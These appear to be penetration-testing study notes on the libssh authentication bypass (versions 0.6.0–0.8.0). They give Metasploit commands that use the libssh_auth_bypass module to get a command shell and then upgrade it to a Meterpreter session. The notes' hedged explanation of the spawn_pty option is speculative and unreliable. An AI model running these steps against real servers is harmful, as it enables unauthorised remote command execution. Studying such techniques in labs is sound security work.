### Vulnerability in SSH
* SSH runs on port 22
* **libssh** is a multi-platform C library implementing the SSHv2 protocol on the cleint and server side.
* libssh V0.6.0-0.8.0 is vulnerable to authentication bypass vulnerability in the libssh server code that can be xploited to execute commands on the target server.

* PRACTICAL
* Same steps until db_nmap
* `search libssh_auth_bypass`
* `use auxiliary/scanner/ssh/libssh_auth_bypass`
* `set spawn_pty true` --> Spawn a PTY.
  * The spawn_pty option likely creates a PTY (pseudo-terminal) to bypass certain authentication mechanisms in SSH servers that rely on specific terminal-related behaviors.
  * This option might aid in bypassing certain restrictions or conditions imposed during authentication, allowing for more effective scanning or exploitation within the context of the module's purpose.
 
* `run` --> Will give a command shell
* `sessions [id]`
* ***
* `use post/multi/manage/shell_to_meterpreter`
* set lhost and session
* `run` ->Meterpreter session
